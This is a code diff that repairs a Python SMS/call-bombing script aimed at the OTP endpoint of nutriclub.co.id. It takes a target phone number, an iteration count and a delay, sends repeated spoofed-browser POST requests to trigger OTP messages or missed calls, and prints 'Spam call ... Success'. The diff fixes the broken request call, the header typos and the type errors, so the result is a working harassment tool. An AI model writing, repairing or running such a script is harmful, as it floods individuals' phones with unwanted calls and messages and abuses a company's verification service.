@@ -2,7 +2,7 @@
 from email import header
 from urllib import response
 from wsgiref import headers
-import requests as rek
+import requests
 import json
 import os
 import sys
@@ -30,33 +30,36 @@ iterasi = int(iterasi)
 delay = input(" Delay : ")
 delay = int(delay)
 
-#API
-api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target
+# API URL
+api_url = "https://www.nutriclub.co.id/otp/?phone=0" + target + "&old_phone=0" + target
 
-#Header API
+# Header API
 headers = {
     "Host": "www.nutriclub.co.id",
-    "content-length": "0", "accept":
-    "aplication/json, text/javascript, */*; q=0.01",
-    "x-requested-with": "XMLHttpRequest",
-    "save-data": "on",
-    "user-agent": "Mozila/5.0 (Linux; Android 8.1.0; CPH1853) ApplyWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "origin": "https://www.nutriclub.co.id",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-mode": "cors",
-    "sec-fetch-dest": "empty", "referer": "https://www.nutriclub.co.id/account/register",
+    "Content-Length": "0",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "X-Requested-With": "XMLHttpRequest",
+    "Save-Data": "on",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+    "Origin": "https://www.nutriclub.co.id",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://www.nutriclub.co.id/account/register",
 }
 
-#Iterasi percobaan pengiriman paket pesan
+# Iterasi untuk mengirim pesan
 for i in range(iterasi):
-    respon = rek.post(api_url.headers).text
-    print(" Message iteration -", i)
-    print(" Sended message ...... ")
+    response = requests.post(api_url, headers=headers).text
+    print("Message iteration -", i)
+    print("Sent message ......")
     time.sleep(delay)
 
 #json status
-status = json.loads(respon)["StatusMessage"]
-if status == "Request misscall success":
-    print("\n {*} Spam call / Phone Number"+ target+" Success \n")
+response_json = json.loads(response)
+status = response_json.get("StatusMessage")
+
+if status == "Request misscall berhasil":
+    print("\n {*} Spam call / Phone Number " + target + " Success \n")
 else:
-    print("\n {*} Spam has been "+iterasi+"x >> failed; \n")
+    print("\n {*} Spam has been " + str(iterasi) + "x >> failed; \n")
